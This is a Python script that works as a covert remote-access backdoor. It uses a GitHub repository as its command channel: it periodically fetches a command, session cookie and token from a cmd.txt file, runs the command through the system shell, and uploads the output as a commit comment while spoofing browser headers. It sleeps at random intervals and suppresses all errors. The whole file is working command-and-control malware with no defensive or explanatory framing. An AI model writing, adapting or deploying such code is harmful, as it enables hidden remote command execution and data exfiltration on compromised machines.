#!/usr/bin/env python
# -*- coding: UTF-8 -*-


"""
Created on 2020/4/9 

@author: tmy
"""
import re
import subprocess
try:
    from urllib2 import urlopen
    from urllib2 import Request
    from urllib import urlencode
except:
    from urllib.parse import urlencode
    from urllib.request import urlopen
    from urllib.request import Request
import random



from time import sleep


def get_cmd():
    request = Request("https://github.com/Lonely-night/githubTunnel/blob/master/cmd.txt")
    request.add_header('content-TYPE', 'application/x-www-form-urlencoded')
    response = urlopen(request)
    data = response.read()
    data = str(data)
    cmds = re.findall(r"duye_cmd:{([^}]+)}", data)
    token = re.findall(r"token:{([^}]+)}", data)
    session = re.findall(r"session:{([^}]+)}", data)
    return cmds[0], token[0], session[0]


def run_cmd(cmd):
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    out = str(out).strip() + str(err)
    return out


def upload_result(session, token, result):
    request = Request("https://github.com/Lonely-night/githubTunnel/commit_comment/create")
    request.add_header('Content-Type', 'application/x-www-form-urlencoded')
    request.add_header('X-Requested-With', 'XMLHttpRequest')
    request.add_header('Accept', 'application/json')
    request.add_header('X-Timeline-Last-Modified', 'Thu, 09 Apr 2020 12:46:57 GMT')
    request.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:72.0)')
    request.add_header('Cookie', 'user_session={session}; __Host-user_session_same_site={session};'.format(session=session))
    data = {"authenticity_token": token,
            "commit_id": "41811231fd220ae9af2038ec1fcbb50819aaedf9",
            "comment[body]": result
         }
    response = urlopen(request, urlencode(data).encode('utf-8'))
    return True


def run():
    last_cmd = ""
    while True:
        random_time = random.randint(0, 60)
        sleep(random_time)
        try:
            cmd, token, session = get_cmd()
            if cmd == last_cmd:
                continue
            last_cmd = cmd
            result = run_cmd(cmd)
            upload_result(session, token, result)
        except:
            pass


if __name__ == '__main__':
    run()
